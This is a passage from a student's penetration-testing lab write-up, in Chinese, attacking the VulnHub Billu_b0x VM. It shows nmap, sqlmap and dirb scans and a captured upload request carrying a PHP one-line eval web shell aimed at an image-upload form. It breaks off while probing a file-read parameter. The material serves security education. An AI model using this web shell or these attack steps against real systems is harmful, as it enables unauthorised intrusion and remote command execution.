
<!DOCTYPE html>

<html class="no-js" lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width,initial-scale=1" name="viewport"/>
<link href="../lab04/" rel="prev"/>
<link href="../../ICS%26%26CSAPP-Lab/intro/" rel="next"/>
<link href="../../../assets/images/favicon.png" rel="icon"/>
<meta content="mkdocs-1.6.1, mkdocs-material-9.6.20" name="generator"/>
<title>Lab05 - CSNote</title>
<link href="../../../assets/stylesheets/main.e53b48f4.min.css" rel="stylesheet"/>
<link href="../../../assets/stylesheets/palette.06af60db.min.css" rel="stylesheet"/>
<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
<link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
<style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
<link href="../../../stylesheets/extra.css" rel="stylesheet"/>
<link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css" rel="stylesheet"/>
<link href="https://fonts.loli.net/css?family=JetBrains Mono:400,500,600,700&amp;display=swap" rel="stylesheet"/>
<link href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css" rel="stylesheet"/>
<script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
</head>
<body data-md-color-accent="indigo" data-md-color-primary="black" data-md-color-scheme="default" dir="ltr">
<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
<label class="md-overlay" for="__drawer"></label>
<div data-md-component="skip">
<a class="md-skip" href="#lab05-writeup">
          Skip to content
        </a>
</div>
<div data-md-component="announce">
</div>
<header class="md-header md-header--shadow" data-md-component="header">
<nav aria-label="Header" class="md-header__inner md-grid">
<a aria-label="CSNote" class="md-header__button md-logo" data-md-component="logo" href="../../.." title="CSNote">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
</a>
<label class="md-header__button md-icon" for="__drawer">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
</label>
<div class="md-header__title" data-md-component="header-title">
<div class="md-header__ellipsis">
<div class="md-header__topic">
<span class="md-ellipsis">
            CSNote
          </span>
</div>
<div class="md-header__topic" data-md-component="header-topic">
<span class="md-ellipsis">
            
              Lab05
            
          </span>
</div>
</div>
</div>
</nav>
</header>
<div class="md-container" data-md-component="container">
<main class="md-main" data-md-component="main">
<div class="md-main__inner md-grid">
<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav aria-label="Navigation" class="md-nav md-nav--primary" data-md-level="0">
<label class="md-nav__title" for="__drawer">
<a aria-label="CSNote" class="md-nav__button md-logo" data-md-component="logo" href="../../.." title="CSNote">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
</a>
    CSNote
  </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../..">
<span class="md-ellipsis">
    index
    
  </span>
</a>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2" type="checkbox"/>
<label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
<span class="md-ellipsis">
    OI-learning
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_2">
<span class="md-nav__icon md-icon"></span>
            OI-learning
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/">
<span class="md-ellipsis">
    intro
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/C%2B%2B%20OOP/">
<span class="md-ellipsis">
    C++ 面向对象
    
  </span>
</a>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_3" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
<span class="md-ellipsis">
    Algorithm
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_3_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_2_3">
<span class="md-nav__icon md-icon"></span>
            Algorithm
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Algorithm/STL_algorithm/">
<span class="md-ellipsis">
    STL 算法库 ref
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Algorithm/fastpow/">
<span class="md-ellipsis">
    快速幂
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_4" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
<span class="md-ellipsis">
    Data Structure
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_4_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_2_4">
<span class="md-nav__icon md-icon"></span>
            Data Structure
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Data-Structure/linkedlist/">
<span class="md-ellipsis">
    链表
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Data-Structure/vector/">
<span class="md-ellipsis">
    STL vector ref
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Data-Structure/stack/">
<span class="md-ellipsis">
    栈 &amp;&amp; 单调栈
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Data-Structure/queue/">
<span class="md-ellipsis">
    队列 &amp;&amp; 单调队列
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Data-Structure/hashmap/">
<span class="md-ellipsis">
    哈希表
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--active md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" id="__nav_3" type="checkbox"/>
<label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
<span class="md-ellipsis">
    Course Notes
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="true" aria-labelledby="__nav_3_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_3">
<span class="md-nav__icon md-icon"></span>
            Course Notes
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_3_1" type="checkbox"/>
<label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
<span class="md-ellipsis">
    ICSPA x86 note
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_3_1_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_3_1">
<span class="md-nav__icon md-icon"></span>
            ICSPA x86 note
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICSPA-x86/PA0/">
<span class="md-ellipsis">
    PA0
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICSPA-x86/PA1/">
<span class="md-ellipsis">
    PA1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICSPA-x86/PA2-1/">
<span class="md-ellipsis">
    PA2-1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICSPA-x86/i386/">
<span class="md-ellipsis">
    i386 指令结构 for PA2-1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICSPA-x86/PA2-2/">
<span class="md-ellipsis">
    PA2-2
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--active md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" id="__nav_3_2" type="checkbox"/>
<label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
<span class="md-ellipsis">
    网络攻防实战 note
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="true" aria-labelledby="__nav_3_2_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_3_2">
<span class="md-nav__icon md-icon"></span>
            网络攻防实战 note
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../lab01/">
<span class="md-ellipsis">
    Lab01
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../lab02/">
<span class="md-ellipsis">
    Lab02
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../lab03/">
<span class="md-ellipsis">
    Lab03
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../lab04/">
<span class="md-ellipsis">
    Lab04
    
  </span>
</a>
</li>
<li class="md-nav__item md-nav__item--active">
<input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
<label class="md-nav__link md-nav__link--active" for="__toc">
<span class="md-ellipsis">
    Lab05
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<a class="md-nav__link md-nav__link--active" href="./">
<span class="md-ellipsis">
    Lab05
    
  </span>
</a>
<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
<label class="md-nav__title" for="__toc">
<span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="#_1">
<span class="md-ellipsis">
      渗透目的
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_2">
<span class="md-ellipsis">
      具体操作
    </span>
</a>
<nav aria-label="具体操作" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#_3">
<span class="md-ellipsis">
      信息收集
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#1-http">
<span class="md-ellipsis">
      尝试方向 1: HTTP
    </span>
</a>
<nav aria-label="尝试方向 1: HTTP" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#http">
<span class="md-ellipsis">
      HTTP 目录爆破
    </span>
</a>
<nav aria-label="HTTP 目录爆破" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#add">
<span class="md-ellipsis">
      /add 子页面
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#test">
<span class="md-ellipsis">
      /test 子页面
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#indexphp">
<span class="md-ellipsis">
      /index.php 根页面
    </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#2-ssh">
<span class="md-ellipsis">
      尝试方向 2: SSH
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_4">
<span class="md-ellipsis">
      渗透结果
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_5">
<span class="md-ellipsis">
      渗透全过程图示
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_6">
<span class="md-ellipsis">
      其他
    </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_3_3" type="checkbox"/>
<label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
<span class="md-ellipsis">
    ICS &amp;&amp; CSAPP Labs
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_3_3_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_3_3">
<span class="md-nav__icon md-icon"></span>
            ICS &amp;&amp; CSAPP Labs
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICS%26%26CSAPP-Lab/intro/">
<span class="md-ellipsis">
    intro
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICS%26%26CSAPP-Lab/Datalab/">
<span class="md-ellipsis">
    CSAPP Datalab
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICS%26%26CSAPP-Lab/Bomblab/">
<span class="md-ellipsis">
    CSAPP Bomblab
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICS%26%26CSAPP-Lab/Binalab/">
<span class="md-ellipsis">
    ICS Binalab
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_4" type="checkbox"/>
<label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
<span class="md-ellipsis">
    Deep Learning
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_4_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_4">
<span class="md-nav__icon md-icon"></span>
            Deep Learning
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../Deep-Learning/intro/">
<span class="md-ellipsis">
    intro
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
<label class="md-nav__title" for="__toc">
<span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="#_1">
<span class="md-ellipsis">
      渗透目的
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_2">
<span class="md-ellipsis">
      具体操作
    </span>
</a>
<nav aria-label="具体操作" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#_3">
<span class="md-ellipsis">
      信息收集
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#1-http">
<span class="md-ellipsis">
      尝试方向 1: HTTP
    </span>
</a>
<nav aria-label="尝试方向 1: HTTP" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#http">
<span class="md-ellipsis">
      HTTP 目录爆破
    </span>
</a>
<nav aria-label="HTTP 目录爆破" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#add">
<span class="md-ellipsis">
      /add 子页面
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#test">
<span class="md-ellipsis">
      /test 子页面
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#indexphp">
<span class="md-ellipsis">
      /index.php 根页面
    </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#2-ssh">
<span class="md-ellipsis">
      尝试方向 2: SSH
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_4">
<span class="md-ellipsis">
      渗透结果
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_5">
<span class="md-ellipsis">
      渗透全过程图示
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_6">
<span class="md-ellipsis">
      其他
    </span>
</a>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="md-content" data-md-component="content">
<article class="md-content__inner md-typeset">
<h1 id="lab05-writeup">网络攻防实战 Lab05 Writeup</h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p>✍ 1975 words  | 🐛 257 codelines  | ⏰ 10 min read | Enjoy 🎶</p>
</div>
<div class="admonition quote">
<p class="admonition-title">使用的靶机为 VulnHub IndiShell Lab: Billu_b0x</p>
</div>
<div class="admonition success">
<p class="admonition-title">目前为止最复杂 &amp;&amp; 解法最多的靶机</p>
</div>
<h2 id="_1">渗透目的</h2>
<p>取得目标靶机的 root 权限</p>
<p>了解 SQL 注入，dirb 地址爆破，远程文件下载，图片马攻击等渗透方法</p>
<h2 id="_2">具体操作</h2>
<h3 id="_3">信息收集</h3>
<p>启动 VirtualBox 中的 Kali 攻击机（用于进行渗透攻击）与 Kioptix 靶机，网络采用 NAT 连接</p>
<p><code>ifconfig</code> 获取攻击机的 ip 为 <code>10.0.2.3</code>，使用 <code>nmap</code> 扫描 ip：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; nmap -sn 10.0.2.0/24
Starting Nmap 7.95 ( nmap.org ) at 2025-10-21 08:42 CST
Nmap scan report for bogon (10.0.2.1)
Host is up (0.00033s latency).
MAC Address: 52:55:0A:00:02:01 (Unknown)
Nmap scan report for bogon (10.0.2.2)
Host is up (0.00026s latency).
MAC Address: 08:00:27:F2:95:CC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for bogon (10.0.2.5)
Host is up (0.0013s latency).
MAC Address: 08:00:27:1C:31:B1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for bogon (10.0.2.3)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.94 seconds
</code></pre></div></td></tr></table></div>
<p>考虑靶机 ip 为 <code>10.0.2.5</code>，继续扫描端口 <code>nmap -sV -sC 10.0.2.5</code>，看看有哪些服务项</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; nmap -sV -sC 10.0.2.5
Starting Nmap 7.95 ( nmap.org ) at 2025-10-21 08:42 CST
Nmap scan report for bogon (10.0.2.5)
Host is up (0.0028s latency).
Not shown: 998 closed tcp ports (reset)

// SSH 服务
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de (DSA)
|   2048 88:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 (RSA)
|_  256 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca (ECDSA)

// HTTP 服务
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: --==[[IndiShell Lab]]==--
|_http-server-header: Apache/2.2.22 (Ubuntu)
MAC Address: 08:00:27:1C:31:B1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.80 seconds
</code></pre></div></td></tr></table></div>
<p>同时确定靶机操作系统为 <code>Ubuntu</code></p>
<hr/>
<h3 id="1-http">尝试方向 1: HTTP</h3>
<p><img alt="image-20251021084739779" src="../images/image-20251021084739779.png"/></p>
<p>发现需要账号和密码，sqlmap 扫不到注入点，但是此处 “Show me your SQLI skills” 说明应该有注入点；随意输入账号密码登录，抓包内容也没什么线索</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; sqlmap -u 10.0.2.5 --forms --crawl=2 --risk=2 --level=3
// 最终 sqlmap 的结果
[09:43:21] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
</code></pre></div></td></tr></table></div>
<h4 id="http">HTTP 目录爆破</h4>
<p>决定用 <code>dirb</code> 扫一下，扫出来东西不少，以下是精简后的内容：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span></pre></div></td><td class="code"><div><pre><span></span><code>dirb http://10.0.2.5 /usr/share/dirb/wordlists/big.txt
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Oct 21 09:24:16 2025
URL_BASE: http://10.0.2.5/
WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://10.0.2.5/ ----
+ http://10.0.2.5/add (CODE:200|SIZE:307)
+ http://10.0.2.5/c (CODE:200|SIZE:1)
+ http://10.0.2.5/cgi-bin/ (CODE:403|SIZE:284)
+ http://10.0.2.5/head (CODE:200|SIZE:2793)
==&gt; DIRECTORY: http://10.0.2.5/images/
+ http://10.0.2.5/in (CODE:200|SIZE:47524)
+ http://10.0.2.5/index (CODE:200|SIZE:3267)
+ http://10.0.2.5/panel (CODE:302|SIZE:2469)
==&gt; DIRECTORY: http://10.0.2.5/phpmy/
+ http://10.0.2.5/server-status (CODE:403|SIZE:289)
+ http://10.0.2.5/show (CODE:200|SIZE:1)
+ http://10.0.2.5/test (CODE:200|SIZE:72)
==&gt; DIRECTORY: http://10.0.2.5/uploaded_images/
// 省略每个 Directory 里的内容
-----------------
END_TIME: Tue Oct 21 09:26:36 2025
DOWNLOADED: 61374 - FOUND: 37
</code></pre></div></td></tr></table></div>
<p>以下是几个重点关注的 subsite（至少可以正常打开）：</p>
<blockquote>
<p>10.0.2.5/add</p>
<p>一个上传图片的入口，怀疑可以上传图片马（比如 php 一句话木马）</p>
</blockquote>
<p><img alt="image-20251021104214819" src="../images/image-20251021104214819.png"/></p>
<blockquote>
<p>10.0.2.5/test</p>
<p>缺少一个 file 字段，怀疑可以在 /add 网站上传图片马后在这里访问，也有可能是任意文件读取漏洞</p>
</blockquote>
<p><img alt="image-20251021104628374" src="../images/image-20251021104628374.png"/></p>
<blockquote>
<p>10.0.2.5/in</p>
<p>PHP 环境与配置一览无遗，最核心的是 System 字段，展示了靶机系统和内核版本</p>
</blockquote>
<p><img alt="image-20251021104434863" src="../images/image-20251021104434863.png"/></p>
<blockquote>
<p>10.0.2.5/phpmy</p>
<p>php 登录页面，默认密码不正确</p>
</blockquote>
<p><img alt="image-20251021104524680" src="../images/image-20251021104524680.png"/></p>
<blockquote>
<p>10.0.2.5/index</p>
<p>默认的登录网站，我真的不相信没有 SQL 注入点</p>
</blockquote>
<h5 id="add">/add 子页面</h5>
<p>看上去只能上传照片，前端没有 js 检查，应该是后端检查：</p>
<p>尝试上传一个 php 一句话木马 <code>shell.php</code>，用 BurpSuite 抓包一下：</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span></pre></div></td><td class="code"><div><pre><span></span><code>POST /add HTTP/1.1
Host: 10.0.2.5
Content-Length: 609
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://10.0.2.5
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySAc3kUlEiXINjlY8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.0.2.5/add
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=ivqiuu7jaq7egeeijdbacpn1r4
Connection: keep-alive

------WebKitFormBoundarySAc3kUlEiXINjlY8
Content-Disposition: form-data; name="image"; filename="shell.php"
Content-Type: application/x-php

&lt;?php eval($_POST['cmd']); ?&gt;

------WebKitFormBoundarySAc3kUlEiXINjlY8
Content-Disposition: form-data; name="name"

name
------WebKitFormBoundarySAc3kUlEiXINjlY8
Content-Disposition: form-data; name="address"

address
------WebKitFormBoundarySAc3kUlEiXINjlY8
Content-Disposition: form-data; name="id"

1337
------WebKitFormBoundarySAc3kUlEiXINjlY8
Content-Disposition: form-data; name="upload"

upload
------WebKitFormBoundarySAc3kUlEiXINjlY8--
</code></pre></div></td></tr></table></div>
<p>把 <code>application/octet-stream</code> 修改为 <code>image-jpeg</code> （后来发现都不需要改），上传上去发现 <strong>200 OK</strong> 了，但是好像什么响应都没有，<code>/uploaded_images</code> 也没有出现内容，应该是没有用（或者说是一个缺乏具体应用场景的空壳）</p>
<p><img alt="image-20251021111245151" src="../images/image-20251021111245151.png"/></p>
<h5 id="test">/test 子页面</h5>
<p>页面的内容是：</p>
<blockquote>
<p>'file' parameter is empty. Please provide file path in 'file' parameter</p>
</blockquote>
<p>一开始我推测这里可以运行 <code>/add</code> 上传的文件，但是发现没有实际上传，于是推测这里可以远程文件读取，但是 file 字段似乎始终不可用，BurpSuite 抓包一下</p>
<p><img alt="image-20251021113852274" src="../images/image-20251021113852274.png"/></p>
